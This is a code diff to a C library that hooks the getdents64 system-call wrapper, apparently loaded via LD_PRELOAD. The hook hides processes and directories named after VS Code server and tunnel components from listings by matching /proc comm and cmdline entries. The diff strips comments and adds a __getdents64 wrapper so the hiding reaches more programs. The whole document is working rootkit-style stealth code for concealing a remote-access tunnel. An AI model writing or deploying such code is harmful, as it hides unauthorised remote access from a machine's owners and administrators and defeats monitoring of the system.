@@ -34,7 +34,6 @@ static int should_hide(const char *name) {
     }
     
     // Substring matches for our specific directories/tools
-    // but NOT for generic things like "node" (to avoid breaking python/npm)
     if (strstr(name, "code-tunnel") != NULL) return 1;
     if (strstr(name, "vscode-server") != NULL) return 1;
     
@@ -69,7 +68,6 @@ static int check_process_name(const char *pid_str) {
     char path[64];
     int fd;
     
-    // 1. Check comm (fast path)
     snprintf(path, sizeof(path), "/proc/%s/comm", pid_str);
     fd = open(path, O_RDONLY);
     if (fd != -1) {
@@ -84,7 +82,6 @@ static int check_process_name(const char *pid_str) {
         }
     }
 
-    // 2. Check cmdline (to catch scripts run via sh/node/python)
     snprintf(path, sizeof(path), "/proc/%s/cmdline", pid_str);
     fd = open(path, O_RDONLY);
     if (fd != -1) {
@@ -92,9 +89,6 @@ static int check_process_name(const char *pid_str) {
         ssize_t n = read(fd, cmdline, sizeof(cmdline)-1);
         close(fd);
         if (n > 0) {
-            // cmdline contains null-terminated strings. We check the whole buffer.
-            // Using a loop to handle null bytes if needed, but strstr on the buffer works 
-            // for the first few arguments which is usually enough.
             if (strstr(cmdline, "vscode-server") != NULL) return 1;
             if (strstr(cmdline, "code-server") != NULL) return 1;
             if (strstr(cmdline, "code-tunnel") != NULL) return 1;
@@ -129,7 +123,10 @@ typedef ssize_t (*orig_getdents64_f)(int, void *, size_t);
 static orig_getdents64_f real_getdents64 = NULL;
 
 ssize_t getdents64(int fd, void *dirp, size_t count) {
-    if (!real_getdents64) real_getdents64 = (orig_getdents64_f)dlsym(RTLD_NEXT, "getdents64");
+    if (!real_getdents64) {
+        real_getdents64 = (orig_getdents64_f)dlsym(RTLD_NEXT, "getdents64");
+        if (!real_getdents64) real_getdents64 = (orig_getdents64_f)dlsym(RTLD_NEXT, "__getdents64");
+    }
     if (!real_getdents64) return -1;
 
     ssize_t nread = real_getdents64(fd, dirp, count);
@@ -157,4 +154,9 @@ ssize_t getdents64(int fd, void *dirp, size_t count) {
         }
     }
     return nread;
+}
+
+// Some apps use __getdents64 instead of getdents64
+ssize_t __getdents64(int fd, void *dirp, size_t count) {
+    return getdents64(fd, dirp, count);
 }
